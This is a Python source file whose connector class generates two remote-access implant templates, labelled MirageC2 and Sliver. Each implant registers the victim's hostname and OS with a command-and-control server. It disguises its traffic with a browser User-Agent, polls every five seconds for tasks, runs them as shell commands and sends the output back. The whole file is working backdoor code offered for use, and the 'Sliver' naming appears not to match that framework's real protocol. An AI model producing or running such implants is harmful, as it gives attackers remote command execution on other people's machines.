import requests
import json
import base64
import time
from typing import Dict, List

class MirageC2Connector:
    """Connect to MirageC2 framework for advanced C2 operations."""
    
    def __init__(self, server_url: str, api_key: str):
        self.server_url = server_url.rstrip('/')
        self.api_key = api_key
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json'
        })
    
    def generate_mirage_payload(self, listener_name: str, arch: str = "amd64") -> str:
        """Generate MirageC2 payload."""
        
        mirage_template = f'''
import requests
import base64
import json
import time
import subprocess
import os

class MirageAgent:
    def __init__(self, server_url="{self.server_url}", listener="{listener_name}"):
        self.server_url = server_url
        self.listener = listener
        self.session = requests.Session()
        self.session.headers.update({{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }})
        
    def register_agent(self):
        """Register agent with MirageC2."""
        data = {{
            'listener': self.listener,
            'arch': '{arch}',
            'os': os.name,
            'hostname': os.environ.get('COMPUTERNAME', 'unknown')
        }}
        
        try:
            response = self.session.post(
                f"{{self.server_url}}/api/agents/register",
                json=data
            )
            return response.json() if response.status_code == 200 else None
        except Exception as e:
            print(f"Registration failed: {{e}}")
            return None
    
    def get_tasks(self):
        """Get tasks from C2 server."""
        try:
            response = self.session.get(
                f"{{self.server_url}}/api/tasks/{{self.listener}}"
            )
            return response.json() if response.status_code == 200 else []
        except Exception as e:
            print(f"Task retrieval failed: {{e}}")
            return []
    
    def execute_task(self, task):
        """Execute a task and return results."""
        try:
            if task['type'] == 'shell':
                result = subprocess.run(
                    task['command'],
                    shell=True,
                    capture_output=True,
                    text=True
                )
                return {{
                    'task_id': task['id'],
                    'output': result.stdout,
                    'error': result.stderr,
                    'exit_code': result.returncode
                }}
            elif task['type'] == 'download':
                # Handle file download
                return {{'task_id': task['id'], 'status': 'download_complete'}}
            else:
                return {{'task_id': task['id'], 'error': 'Unknown task type'}}
        except Exception as e:
            return {{'task_id': task['id'], 'error': str(e)}}
    
    def send_results(self, results):
        """Send task results back to C2."""
        try:
            response = self.session.post(
                f"{{self.server_url}}/api/results",
                json=results
            )
            return response.status_code == 200
        except Exception as e:
            print(f"Result submission failed: {{e}}")
            return False
    
    def run(self):
        """Main agent loop."""
        print(f"[+] Registering with MirageC2 at {{self.server_url}}")
        agent_info = self.register_agent()
        
        if not agent_info:
            print("[!] Failed to register agent")
            return
        
        print(f"[+] Agent registered: {{agent_info.get('agent_id', 'unknown')}}")
        
        while True:
            try:
                tasks = self.get_tasks()
                
                for task in tasks:
                    print(f"[+] Executing task: {{task.get('type', 'unknown')}}")
                    results = self.execute_task(task)
                    self.send_results(results)
                
                time.sleep(5)  # Poll every 5 seconds
                
            except KeyboardInterrupt:
                print("\\n[!] Agent stopped by user")
                break
            except Exception as e:
                print(f"[!] Agent error: {{e}}")
                time.sleep(10)

# Start the agent
if __name__ == "__main__":
    agent = MirageAgent()
    agent.run()
'''
        
        return mirage_template
    
    def generate_sliver_payload(self, profile_name: str) -> str:
        """Generate Sliver C2 payload."""
        
        sliver_template = f'''
import requests
import base64
import json
import time
import subprocess
import os

class SliverAgent:
    def __init__(self, server_url="{self.server_url}", profile="{profile_name}"):
        self.server_url = server_url
        self.profile = profile
        self.session = requests.Session()
        self.session.headers.update({{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }})
        
    def register_implant(self):
        """Register implant with Sliver."""
        data = {{
            'profile': self.profile,
            'os': os.name,
            'arch': 'amd64',
            'hostname': os.environ.get('COMPUTERNAME', 'unknown')
        }}
        
        try:
            response = self.session.post(
                f"{{self.server_url}}/api/v1/implants/register",
                json=data
            )
            return response.json() if response.status_code == 200 else None
        except Exception as e:
            print(f"Registration failed: {{e}}")
            return None
    
    def get_jobs(self):
        """Get jobs from Sliver."""
        try:
            response = self.session.get(
                f"{{self.server_url}}/api/v1/jobs/{{self.profile}}"
            )
            return response.json() if response.status_code == 200 else []
        except Exception as e:
            print(f"Job retrieval failed: {{e}}")
            return []
    
    def execute_job(self, job):
        """Execute a Sliver job."""
        try:
            if job['type'] == 'shell':
                result = subprocess.run(
                    job['command'],
                    shell=True,
                    capture_output=True,
                    text=True
                )
                return {{
                    'job_id': job['id'],
                    'output': result.stdout,
                    'error': result.stderr,
                    'exit_code': result.returncode
                }}
            else:
                return {{'job_id': job['id'], 'error': 'Unknown job type'}}
        except Exception as e:
            return {{'job_id': job['id'], 'error': str(e)}}
    
    def send_results(self, results):
        """Send job results back to Sliver."""
        try:
            response = self.session.post(
                f"{{self.server_url}}/api/v1/results",
                json=results
            )
            return response.status_code == 200
        except Exception as e:
            print(f"Result submission failed: {{e}}")
            return False
    
    def run(self):
        """Main implant loop."""
        print(f"[+] Registering with Sliver at {{self.server_url}}")
        implant_info = self.register_implant()
        
        if not implant_info:
            print("[!] Failed to register implant")
            return
        
        print(f"[+] Implant registered: {{implant_info.get('implant_id', 'unknown')}}")
        
        while True:
            try:
                jobs = self.get_jobs()
                
                for job in jobs:
                    print(f"[+] Executing job: {{job.get('type', 'unknown')}}")
                    results = self.execute_job(job)
                    self.send_results(results)
                
                time.sleep(5)
                
            except KeyboardInterrupt:
                print("\\n[!] Implant stopped by user")
                break
            except Exception as e:
                print(f"[!] Implant error: {{e}}")
                time.sleep(10)

# Start the implant
if __name__ == "__main__":
    implant = SliverAgent()
    implant.run()
'''
        
        return sliver_template 